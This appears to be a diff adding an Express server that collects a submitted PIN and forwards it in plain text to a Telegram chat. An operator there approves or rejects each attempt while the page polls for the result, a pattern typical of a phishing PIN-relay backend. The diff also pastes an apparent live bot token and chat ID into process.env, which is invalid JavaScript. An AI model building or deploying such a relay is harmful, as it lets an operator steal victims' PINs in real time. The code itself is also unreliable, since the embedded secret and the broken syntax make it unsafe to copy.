@@ -1,1 +1,55 @@
 
+require('dotenv').config();
+const express = require('express');
+const path = require('path');
+const app = express();
+
+app.use(express.json());
+app.use(express.static(path.join(__dirname))); // serves index.html, assets, gifs
+
+const BOT_TOKEN = process.env.8740689959:AAG0bf7hclLo6G6sLoKcoxX4nyVFfJYrWrg;
+const ADMIN_CHAT_ID = process.env.7412590888;
+const pendingRequests = {};
+
+app.post('/api/verify-pin', async (req, res) => {
+  const { pin } = req.body;
+  const requestId = Date.now().toString();
+  pendingRequests[requestId] = { pin, status: 'pending' };
+
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: ADMIN_CHAT_ID,
+      text: `PIN submitted: ${pin}\nRequest ID: ${requestId}`,
+      reply_markup: {
+        inline_keyboard: [[
+          { text: '✅ Approve', callback_data: `approve_${requestId}` },
+          { text: '❌ Reject', callback_data: `reject_${requestId}` }
+        ]]
+      }
+    })
+  });
+
+  res.json({ requestId, status: 'pending' });
+});
+
+app.get('/api/verify-pin/status/:requestId', (req, res) => {
+  const request = pendingRequests[req.params.requestId];
+  if (!request) return res.status(404).json({ error: 'Not found' });
+  res.json({ status: request.status });
+});
+
+app.post('/api/telegram-webhook', (req, res) => {
+  const callback = req.body.callback_query;
+  if (callback) {
+    const [action, requestId] = callback.data.split('_');
+    if (pendingRequests[requestId]) {
+      pendingRequests[requestId].status = action === 'approve' ? 'approved' : 'rejected';
+    }
+  }
+  res.sendStatus(200);
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
